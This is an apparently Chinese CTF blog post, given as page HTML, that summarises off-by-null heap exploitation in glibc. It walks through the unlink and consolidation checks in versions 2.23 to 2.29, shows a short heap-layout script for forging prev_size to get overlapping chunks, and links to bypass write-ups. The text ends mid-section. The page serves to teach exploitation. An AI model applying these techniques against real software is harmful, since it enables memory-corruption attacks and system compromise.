<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1"><meta name="format-detection" content="telephone=no"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black"><link rel="icon" href="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsfavicon-16x16.png?v=2.6.2" type="image/png" sizes="16x16"><link rel="icon" href="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsfavicon-32x32.png?v=2.6.2" type="image/png" sizes="32x32"><link rel="mask-icon" href="/%5Bobject%20Object%5D?v=2.6.2" color="#54bcff"><meta name="description" content="前言       off-by-null是堆中的常见漏洞，很多时候都是结合堆布局来进行利用的。这里结合原理解析、不同版本和条件的off-by-null以及常见的漏洞条件做个总结。                     一、原理解析       主要发生在_int_free的unlink中： 123456789101112131415161718192021">
<meta property="og:type" content="article">
<meta property="og:title" content="off-by-null总结">
<meta property="og:url" content="http://pig-007.github.io/2021/08/31/off-by-null%E6%80%BB%E7%BB%93/index.html">
<meta property="og:site_name" content="PIG-007">
<meta property="og:description" content="前言       off-by-null是堆中的常见漏洞，很多时候都是结合堆布局来进行利用的。这里结合原理解析、不同版本和条件的off-by-null以及常见的漏洞条件做个总结。                     一、原理解析       主要发生在_int_free的unlink中： 123456789101112131415161718192021">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/20210831114803.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/20210831115708.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/20210831123554.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/20210831122206.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/20210831184255.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/20210831194137.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/20210831200742.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/20210831204034.png">
<meta property="article:published_time" content="2021-08-31T02:25:33.000Z">
<meta property="article:modified_time" content="2022-02-25T03:38:56.191Z">
<meta property="article:author" content="PIG-007">
<meta property="article:tag" content="off-by-null">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/20210831114803.png"><title>off-by-null总结 | PIG-007</title><link ref="canonical" href="http://pig-007.github.io/2021/08/31/off-by-null%E6%80%BB%E7%BB%93/"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.12.1/css/all.min.css" type="text/css"><link rel="stylesheet" href="/css/index.css?v=2.6.2"><script>var Stun = window.Stun || {};
var CONFIG = {
  root: '/',
  algolia: undefined,
  assistSearch: undefined,
  fontIcon: {"prompt":{"success":"fas fa-check-circle","info":"fas fa-arrow-circle-right","warning":"fas fa-exclamation-circle","error":"fas fa-times-circle"},"copyBtn":"fas fa-copy"},
  sidebar: {"offsetTop":"20px","tocMaxDepth":6},
  header: {"enable":true,"showOnPost":true,"scrollDownIcon":false},
  postWidget: {"endText":true},
  nightMode: {"enable":true},
  back2top: {"enable":true},
  codeblock: {"style":"default","highlight":"light","wordWrap":true},
  reward: false,
  fancybox: false,
  zoomImage: {"gapAside":"20px"},
  galleryWaterfall: undefined,
  lazyload: false,
  pjax: undefined,
  externalLink: {"icon":{"enable":true,"name":"fas fa-external-link-alt"}},
  shortcuts: undefined,
  prompt: {"copyButton":"Copy","copySuccess":"Copy Success","copyError":"Copy Error"},
  sourcePath: {"js":"js","css":"css","images":"images"},
};

window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 5.4.0"></head><body><div class="container" id="container"><header class="header" id="header"><div class="header-inner"><nav class="header-nav header-nav--fixed"><div class="header-nav-inner"><div class="header-nav-menubtn"><i class="fas fa-bars"></i></div><div class="header-nav-menu"><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/"><span class="header-nav-menu-item__icon"><i class="fas fa-home"></i></span><span class="header-nav-menu-item__text">Home</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/archives/"><span class="header-nav-menu-item__icon"><i class="fas fa-folder-open"></i></span><span class="header-nav-menu-item__text">Archives</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/categories/"><span class="header-nav-menu-item__icon"><i class="fas fa-layer-group"></i></span><span class="header-nav-menu-item__text">Categories</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/tags/"><span class="header-nav-menu-item__icon"><i class="fas fa-tags"></i></span><span class="header-nav-menu-item__text">Tags</span></a></div></div><div class="header-nav-search"><span class="header-nav-search__icon"><i class="fas fa-search"></i></span><span class="header-nav-search__text">Search</span></div><div class="header-nav-mode"><div class="mode"><div class="mode-track"><span class="mode-track-moon"></span><span class="mode-track-sun"></span></div><div class="mode-thumb"></div></div></div></div></nav><div class="header-banner"><div class="header-banner-info"><div class="header-banner-info__title">PIG-007</div><div class="header-banner-info__subtitle"></div></div></div></div></header><main class="main" id="main"><div class="main-inner"><div class="content-wrap" id="content-wrap"><div class="content" id="content"><!-- Just used to judge whether it is an article page--><div id="is-post"></div><div class="post"><header class="post-header"><h1 class="post-title">off-by-null总结</h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">Created</span><span class="post-meta-item__value">2021-08-31</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">Updated</span><span class="post-meta-item__value">2022-02-25</span></span></div></header><div class="post-body">
        <h1 id="前言"   >
          <a href="#前言" class="heading-link"><i class="fas fa-link"></i></a><a href="#前言" class="headerlink" title="前言"></a>前言</h1>
      <p>off-by-null是堆中的常见漏洞，很多时候都是结合堆布局来进行利用的。这里结合原理解析、不同版本和条件的off-by-null以及常见的漏洞条件做个总结。</p>

        <h1 id="一、原理解析"   >
          <a href="#一、原理解析" class="heading-link"><i class="fas fa-link"></i></a><a href="#一、原理解析" class="headerlink" title="一、原理解析"></a>一、原理解析</h1>
      <p>主要发生在<code>_int_free</code>的unlink中：</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//2.23 when size&gt;global_max_fast</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* consolidate backward */</span></span><br><span class="line"><span class="keyword">if</span> (!prev_inuse(p)) &#123;</span><br><span class="line">    prevsize = p-&gt;prev_size;</span><br><span class="line">    size += prevsize;</span><br><span class="line">    p = chunk_at_offset(p, -((<span class="keyword">long</span>) prevsize));</span><br><span class="line">    unlink(av, p, bck, fwd);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (nextchunk != av-&gt;top) &#123;</span><br><span class="line">    <span class="comment">/* get and clear inuse bit */</span></span><br><span class="line">    nextinuse = inuse_bit_at_offset(nextchunk, nextsize);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* consolidate forward */</span></span><br><span class="line">    <span class="keyword">if</span> (!nextinuse) &#123;</span><br><span class="line">        unlink(av, nextchunk, bck, fwd);</span><br><span class="line">        size += nextsize;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"><span class="comment">/* Take a chunk off a bin list */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> unlink(AV, P, BK, FD) &#123;                                             </span></span><br><span class="line">    FD = P-&gt;fd;								       </span><br><span class="line">    BK = P-&gt;bk;								       </span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="number">0</span>))		       </span><br><span class="line">        malloc_printerr (check_action, <span class="string">&quot;corrupted double-linked list&quot;</span>, P, AV);   </span><br><span class="line">    <span class="keyword">else</span> &#123;								       </span><br><span class="line">        FD-&gt;bk = BK;							       </span><br><span class="line">        BK-&gt;fd = FD;							       </span><br><span class="line">        <span class="keyword">if</span> (!in_smallbin_range (P-&gt;size)				       </span><br><span class="line">            &amp;&amp; __builtin_expect (P-&gt;fd_nextsize != <span class="literal">NULL</span>, <span class="number">0</span>)) </span><br><span class="line">        &#123;		       </span><br><span class="line">            <span class="keyword">if</span> (__builtin_expect (P-&gt;fd_nextsize-&gt;bk_nextsize != P, <span class="number">0</span>)	       </span><br><span class="line">                || __builtin_expect (P-&gt;bk_nextsize-&gt;fd_nextsize != P, <span class="number">0</span>))     </span><br><span class="line">                malloc_printerr (check_action,				       </span><br><span class="line">                                 <span class="string">&quot;corrupted double-linked list (not small)&quot;</span>,     </span><br><span class="line">                                 P, AV);					       </span><br><span class="line">            <span class="keyword">if</span> (FD-&gt;fd_nextsize == <span class="literal">NULL</span>) &#123;				       </span><br><span class="line">                <span class="keyword">if</span> (P-&gt;fd_nextsize == P)				       </span><br><span class="line">                    FD-&gt;fd_nextsize = FD-&gt;bk_nextsize = FD;		       </span><br><span class="line">                <span class="keyword">else</span> &#123;							       </span><br><span class="line">                    FD-&gt;fd_nextsize = P-&gt;fd_nextsize;			       </span><br><span class="line">                    FD-&gt;bk_nextsize = P-&gt;bk_nextsize;			       </span><br><span class="line">                    P-&gt;fd_nextsize-&gt;bk_nextsize = FD;			       </span><br><span class="line">                    P-&gt;bk_nextsize-&gt;fd_nextsize = FD;			       </span><br><span class="line">                &#125;							       </span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;							       </span><br><span class="line">                P-&gt;fd_nextsize-&gt;bk_nextsize = P-&gt;bk_nextsize;		       </span><br><span class="line">                P-&gt;bk_nextsize-&gt;fd_nextsize = P-&gt;fd_nextsize;		       </span><br><span class="line">            &#125;								       </span><br><span class="line">        &#125;								       </span><br><span class="line">    &#125;</span><br><span class="line">&#125;    </span><br></pre></td></tr></table></div></figure>

<p>为了方便，依据物理地址相邻来命名如下：</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/20210831114803.png" alt="Snipaste_2021-08-31_11-47-47"></p>
<p>即当size大于global_max_fast且不是mmap出来的chunk时，就会进入判断。所以这里我们进行释放用的chunk的大小就必须要大于global_max_fast才行，否则就是改掉了pre_inuse位也是直接进入fastbin，不会进入判断的。</p>
<ul>
<li><p>先依据当前chunk(chunkP)的pre_inuse位来判断前一个chunk(preChunk)是否处于释放状态，是则进入unlink，将前一个chunk取出</p>
</li>
<li><p>然后判断下一个chunk(nextChunk)是否是top_chunk，是则直接与top_chunk合并。</p>
</li>
<li><p>若nextChunk不为top_chunk，再判断下一个Chunk的再下一个chunk的pre_inuse位来判断nextChunk是否处于释放状态，若是则进入unlink。</p>
</li>
</ul>
<p>然后unlink中就不细说，就是双向循环链表解链的过程，依据fd和bk来查找并解链，但是我们的off-by-null通常不会涉及到nextsize位的使用，所以基本不用看后面的。需要注意的是，由于这里会检查，即：</p>
<pre><code>if (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, 0))               
    malloc_printerr (check_action, &quot;corrupted double-linked list&quot;, P, AV);
</code></pre>
<p>所以我们需要将进入unlink的chunk的fd和bk来进行伪造或者干脆直接释放使其直接进入unsortedbin中完成双向链表的加持。这里先讲放入unsortedbin中来获取fd和bk的方法，伪造的方法一般用在2.29及以上的高版本中，因为那时候的unlink加入了关于size位的检查，不能简单得伪造fd和bk。</p>
<p>其次，这里还需要明白一个寻找chunk的原理。</p>
<ul>
<li>寻找preChunk：preChunk_addr = chunkP_addr - chunkP-&gt;pre_size</li>
<li>寻找nextChunk：nextChunk_addr = chunkP_addr + chunkP-&gt;size</li>
</ul>
<p>即以下源码，这个一直没有变化过：</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Ptr to previous physical malloc_chunk.  Only valid if !prev_inuse (P).  */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> prev_chunk(p) ((mchunkptr) (((char *) (p)) - prev_size (p)))</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Ptr to next physical malloc_chunk. */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> next_chunk(p) ((mchunkptr) (((char *) (p)) + chunksize (p)))</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Get size, ignoring use bits */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> chunksize(p) (chunksize_nomask (p) &amp; ~(SIZE_BITS))</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* extract p&#x27;s inuse bit */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> inuse(p)							      \</span></span><br><span class="line"><span class="meta">  ((((mchunkptr) (((char *) (p)) + chunksize (p)))-&gt;mchunk_size) &amp; PREV_INUSE)</span></span><br></pre></td></tr></table></div></figure>

<p>所以，如果我们可以伪造pre_size和in_use位，就能触发向上任意寻找一个满足fd和bk为双向链表的chunk，从而将中间所有的chunk都一并合并为一个Chunk释放掉。(向下合并也可以的，不过一般不常使用)</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/20210831115708.png" alt="Snipaste_2021-08-31_11-57-00"></p>
<p>这里就是通过释放chunkP，依据pre_size向上寻找到原本已经在unsortedbin中的preChunk，其FD和BK已经组成双向循环链表，可以绕过检查，所以释放ChunkP之后preChunk+OverlapChunk+chunkP都进入到unsortedbin中。但是OverlapChunk本身其实并没有被释放，我们再从unsortedbin中申请切割出preChunk大小的chunk，再申请就可以得到OverlapChunk。这样我们就有两个指针都指向OverlapChunk，从而伪造出UAF，之后我们就可以通过OverlapChunk来getshell了。</p>

        <h2 id="1-常用布局"   >
          <a href="#1-常用布局" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-常用布局" class="headerlink" title="1.常用布局"></a>1.常用布局</h2>
      <figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">add_malloc(<span class="number">0xf8</span>,<span class="string">&#x27;\x00&#x27;</span>*<span class="number">0xf8</span>)	<span class="comment">#0x1</span></span><br><span class="line">add_malloc(<span class="number">0x68</span>,<span class="string">&#x27;\x00&#x27;</span>*<span class="number">0x68</span>)	<span class="comment">#0x2</span></span><br><span class="line">add_malloc(<span class="number">0xf8</span>,<span class="string">&#x27;\x00&#x27;</span>*<span class="number">0xf8</span>)	<span class="comment">#0x3</span></span><br><span class="line">add_malloc(<span class="number">0x68</span>,<span class="string">&#x27;\x00&#x27;</span>*<span class="number">0x68</span>)	<span class="comment">#0x4</span></span><br><span class="line">free(<span class="number">0x1</span>)</span><br><span class="line">edit(<span class="number">0x2</span>,<span class="number">0x70</span>,<span class="string">&#x27;\x00&#x27;</span>*<span class="number">0x60</span>+p64(<span class="number">0x70</span>+<span class="number">0x100</span>)+p16(<span class="number">0x100</span>))</span><br><span class="line">free(<span class="number">0x3</span>)</span><br></pre></td></tr></table></div></figure>

<p>off-by-null在调试中不太好搞，所以我就借用堆溢出来假设存在off-by-null，将chunk3原本的size位0x101通过off-by-null变成0x100即可。</p>

        <h2 id="2-注意事项"   >
          <a href="#2-注意事项" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-注意事项" class="headerlink" title="2.注意事项"></a>2.注意事项</h2>
      
        <h3 id="1-顺序"   >
          <a href="#1-顺序" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-顺序" class="headerlink" title="(1)顺序"></a>(1)顺序</h3>
      <p>此外需要注意的是，需要先释放chunk1，再溢出修改chunk3。不然如果先修改chunk3，那么释放chunk1的时候，寻找chunk1的nextChunk即chunk2，判断chunk2是否处于释放状态时，会找到chunk3，依据pre_inuse位发现chunk2已经处于释放状态，那么尝试进入unlink合并，但是这里的chunk2的fd和bk并没有组成双向循环链表，所以会出错。</p>

        <h3 id="2-size位的设置"   >
          <a href="#2-size位的设置" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-size位的设置" class="headerlink" title="(2)size位的设置"></a>(2)size位的设置</h3>
      <ul>
<li><p>0x100：这里注意到上面的布局中size位为0x100和0x70，这里的0x100就是为了通过off-by-null将0x101变成0x100设置的。当然设置为0x201，0x301通常也是一样的。</p>
</li>
<li><p>0x70：这里就通常是为了方便打fastbin attack，从_malloc_hook处构造0x7f字节错位用的。</p>
</li>
</ul>

        <h1 id="二、更新换代"   >
          <a href="#二、更新换代" class="heading-link"><i class="fas fa-link"></i></a><a href="#二、更新换代" class="headerlink" title="二、更新换代"></a>二、更新换代</h1>
      
        <h2 id="1-Glibc2-27"   >
          <a href="#1-Glibc2-27" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-Glibc2-27" class="headerlink" title="1.Glibc2.27"></a>1.Glibc2.27</h2>
      <p>这里也不是特指2.27，而指的是Glibc2.29以下的存在tcache的版本，这类版本通常需要填充满tcache再进行释放，也不需要多讲。</p>

        <h2 id="2-Glibc2-29"   >
          <a href="#2-Glibc2-29" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-Glibc2-29" class="headerlink" title="2.Glibc2.29"></a>2.Glibc2.29</h2>
      <p>从这个版本开始，off-by-null由于加入的检查，引入了好几种全新的利用方式。</p>

        <h3 id="1-int-free中的变化"   >
          <a href="#1-int-free中的变化" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-int-free中的变化" class="headerlink" title="(1)_int_free中的变化"></a>(1)_int_free中的变化</h3>
      <figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!prev_inuse(p)) &#123;</span><br><span class="line">    prevsize = prev_size (p);</span><br><span class="line">    size += prevsize;</span><br><span class="line">    p = chunk_at_offset(p, -((<span class="keyword">long</span>) prevsize));</span><br><span class="line">    <span class="keyword">if</span> (__glibc_unlikely (chunksize(p) != prevsize))</span><br><span class="line">        malloc_printerr (<span class="string">&quot;corrupted size vs. prev_size while consolidating&quot;</span>);</span><br><span class="line">    unlink_chunk (av, p);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>加入的检查是</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__glibc_unlikely (chunksize(p) != prevsize))</span><br><span class="line">    malloc_printerr (<span class="string">&quot;corrupted size vs. prev_size while consolidating&quot;</span>);</span><br></pre></td></tr></table></div></figure>

<p>这里的p因为<code>p = chunk_at_offset(p, -((long) prevsize));</code>已经变成了preChunk。所以这里就是检查preChunk-&gt;size是否等于chunkP-&gt;pre_size。按照上面那张图的逻辑，preChunk的size为0x101，chunkP的pre_size为0x170，两个不等于，根本就无法进入unlink中，直接崩掉。</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/20210831123554.png" alt="Snipaste_2021-08-31_11-57-00"></p>

        <h3 id="2-unlink变化"   >
          <a href="#2-unlink变化" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-unlink变化" class="headerlink" title="(2)unlink变化"></a>(2)unlink变化</h3>
      <p>首先unlink从宏定义变成了全局函数定义，名字也从unlink变成了unlink_chunk，但实际内容没有变太多，只是加入了一些检查：</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Take a chunk off a bin list.  */</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span></span></span><br><span class="line"><span class="function">    <span class="title">unlink_chunk</span> <span class="params">(mstate av, mchunkptr p)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (chunksize (p) != prev_size (next_chunk (p)))</span><br><span class="line">        malloc_printerr (<span class="string">&quot;corrupted size vs. prev_size&quot;</span>);</span><br><span class="line"></span><br><span class="line">    mchunkptr fd = p-&gt;fd;</span><br><span class="line">    mchunkptr bk = p-&gt;bk;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (fd-&gt;bk != p || bk-&gt;fd != p, <span class="number">0</span>))</span><br><span class="line">        malloc_printerr (<span class="string">&quot;corrupted double-linked list&quot;</span>);</span><br><span class="line"></span><br><span class="line">    fd-&gt;bk = bk;</span><br><span class="line">    bk-&gt;fd = fd;</span><br><span class="line">    <span class="keyword">if</span> (!in_smallbin_range (chunksize_nomask (p)) &amp;&amp; p-&gt;fd_nextsize != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (p-&gt;fd_nextsize-&gt;bk_nextsize != p</span><br><span class="line">            || p-&gt;bk_nextsize-&gt;fd_nextsize != p)</span><br><span class="line">            malloc_printerr (<span class="string">&quot;corrupted double-linked list (not small)&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (fd-&gt;fd_nextsize == <span class="literal">NULL</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (p-&gt;fd_nextsize == p)</span><br><span class="line">                fd-&gt;fd_nextsize = fd-&gt;bk_nextsize = fd;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                fd-&gt;fd_nextsize = p-&gt;fd_nextsize;</span><br><span class="line">                fd-&gt;bk_nextsize = p-&gt;bk_nextsize;</span><br><span class="line">                p-&gt;fd_nextsize-&gt;bk_nextsize = fd;</span><br><span class="line">                p-&gt;bk_nextsize-&gt;fd_nextsize = fd;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            p-&gt;fd_nextsize-&gt;bk_nextsize = p-&gt;bk_nextsize;</span><br><span class="line">            p-&gt;bk_nextsize-&gt;fd_nextsize = p-&gt;fd_nextsize;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>加入的检查，就加了一个if语句：</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (chunksize (p) != prev_size (next_chunk (p)))</span><br><span class="line">  malloc_printerr (<span class="string">&quot;corrupted size vs. prev_size&quot;</span>);</span><br></pre></td></tr></table></div></figure>

<p>即在unlink时会检查nextChunk的pre_size是否等于chunkP的size。</p>
<p>按照之前那张图的逻辑，进入unlink中时preChunk的size为0x100，preChunk的nextChunk，即overlapChunk的pre_size为0x100，相等，可以满足要求，没啥大用，但是之后提出的绕过手段也是需要绕过这个检查的。</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/20210831122206.png" alt="Snipaste_2021-08-31_11-57-00"></p>
<p>▲后面的更高版本，到2.33都没变化，也就不提了。只是2.32中的指针异或可能需要注意一下，但是之后的绕过手段一般是基于unsortedbin，smallbin，largebin来绕过，不存在指针异或的情况，所以也不用太在意。</p>

        <h1 id="三、高版本花式绕过"   >
          <a href="#三、高版本花式绕过" class="heading-link"><i class="fas fa-link"></i></a><a href="#三、高版本花式绕过" class="headerlink" title="三、高版本花式绕过"></a>三、高版本花式绕过</h1>
      <p>这里将的是2.29及以上的版本</p>

        <h2 id="第一种"   >
          <a href="#第一种" class="heading-link"><i class="fas fa-link"></i></a><a href="#第一种" class="headerlink" title="第一种"></a>第一种</h2>
      <p>这个之前写过，参考这篇文章：</p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.pig-007.top/2021/08/14/2.29%E4%B8%8B%E7%9A%84off-by-null/" >2.29下的off-by-null | PIG-007</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>或者t1an5g师傅的文章：</p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://bbs.pediy.com/thread-257901.htm#msg_header_h2_2" >https://bbs.pediy.com/thread-257901.htm#msg_header_h2_2</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>当然ex师傅的原始解析也很好：</p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="http://blog.eonew.cn/archives/1233" >http://blog.eonew.cn/archives/1233</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>但是这个需要爆破半个字节，也不能对size做太多的限制，且chunk需要申请大概有24个，所以看个人需要。</p>

        <h2 id="第二种"   >
          <a href="#第二种" class="heading-link"><i class="fas fa-link"></i></a><a href="#第二种" class="headerlink" title="第二种"></a>第二种</h2>
      <p>这个也写过，参考这篇：</p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.pig-007.top/2021/08/14/2.29-2.32%E4%B8%8B%E7%9A%84off-by-null/" >2.29-2.32下的off-by-null | PIG-007</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>当然我也是参考WJH师傅的：</p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/236078" >glibc 2.29-2.32 off by null bypass - 安全客，安全资讯平台 (anquanke.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>这个不需要爆破，但是对size的限制不能太严格，需要largebin的size。</p>

        <h2 id="第三种"   >
          <a href="#第三种" class="heading-link"><i class="fas fa-link"></i></a><a href="#第三种" class="headerlink" title="第三种"></a>第三种</h2>
      <p>这个还没写过总结，现在来，不过先贴下文章，init-0师傅的：</p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/231418#h3-8" >堆漏洞利用（2.29以上glibc,off-by-null, 加了申请size限制） - 安全客，安全资讯平台 (anquanke.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>这种方法在size限制下也可以使用，文章中的限制是0xe8的堆块，真是将堆布局用到极高的水平。</p>
<p>▲先看最终的布局效果：</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/20210831184255.png" alt="Snipaste_2021-08-31_18-42-42"></p>
<p>这样就能通过两项检查了：</p>
